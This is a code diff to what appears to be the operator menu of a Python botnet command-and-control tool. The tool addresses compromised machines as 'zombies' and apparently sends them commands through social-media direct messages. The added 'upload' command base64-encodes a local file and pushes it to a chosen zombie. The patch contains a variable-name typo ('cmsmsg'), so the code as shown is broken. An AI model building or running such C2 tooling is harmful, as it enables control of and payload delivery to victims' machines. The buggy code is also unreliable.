@@ -247,6 +247,18 @@ def user_menu():
                                         add_ignore(dm.id)
                                         print("Send python code to [%s]" % zombie)
                                 else: print("[!] Please select zombie first")
+                        elif com == "upload":
+                                try:
+                                        filename = parts[1]
+                                        filedata = open(filename,"r").read()
+                                        cmdmsg = filename+"#data#"+filedata
+                                        cmdmsg = base64.b64encode(cmsmsg.encode()).decode()
+                                        command = {"type":"upload","cmd":cmdmsg,"get_result":True,"background":False}
+                                        msg = format_msg("server",zombie,command,False,False)
+                                        add_ignore(api.send_direct_message(msg).id)
+                                        print("Sent command")
+                                except:
+                                        print("[!] Requires filename as argument")
                         else: print(error_noCmd)
                 else: print(error_noCmd)
 
